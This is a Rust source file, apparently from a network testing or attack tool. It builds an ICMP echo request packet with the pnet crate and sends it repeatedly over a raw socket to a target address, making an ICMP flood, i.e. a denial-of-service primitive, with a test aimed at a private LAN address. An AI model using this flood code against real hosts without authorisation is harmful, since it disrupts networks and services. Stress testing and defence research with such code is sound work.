use anyhow::Result;
use pnet::packet::icmp;
use pnet::packet::icmp::{IcmpCode, IcmpType, MutableIcmpPacket};
use pnet_packet::icmp::echo_request::MutableEchoRequestPacket;
use std::net::Ipv4Addr;

use crate::utils::ICMP_BUFF_SIZE;
use crate::utils::ICMP_DATA_LEN;
use crate::utils::ICMP_HEADER_LEN;
use crate::utils::return_layer4_icmp_channel;

pub fn send_icmp_flood_packet(
    _: Ipv4Addr,
    _: u16, // unified interface
    dst_ipv4: Ipv4Addr,
    _: u16, // unified interface
    max_same_packet: usize,
) -> Result<()> {
    let (mut icmp_tx, _) = return_layer4_icmp_channel(ICMP_BUFF_SIZE)?;

    let mut icmp_buff = [0u8; ICMP_HEADER_LEN + ICMP_DATA_LEN];
    let mut icmp_header = MutableEchoRequestPacket::new(&mut icmp_buff[..]).unwrap();
    icmp_header.set_icmp_code(IcmpCode(0));
    icmp_header.set_icmp_type(IcmpType(8));
    icmp_header.set_sequence_number(1);
    icmp_header.set_identifier(2);

    let mut icmp_header = MutableIcmpPacket::new(&mut icmp_buff).unwrap();
    let checksum = icmp::checksum(&icmp_header.to_immutable());
    icmp_header.set_checksum(checksum);

    for _ in 0..max_same_packet {
        match icmp_tx.send_to(&icmp_header, dst_ipv4.into()) {
            _ => (),
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_icmp_flood_packet() {
        let src_ipv4 = Ipv4Addr::new(192, 168, 213, 129);
        let dst_ipv4 = Ipv4Addr::new(192, 168, 213, 128);
        let ret = send_icmp_flood_packet(src_ipv4, 0, dst_ipv4, 0, 1).unwrap();
        println!("{:?}", ret);
    }
}
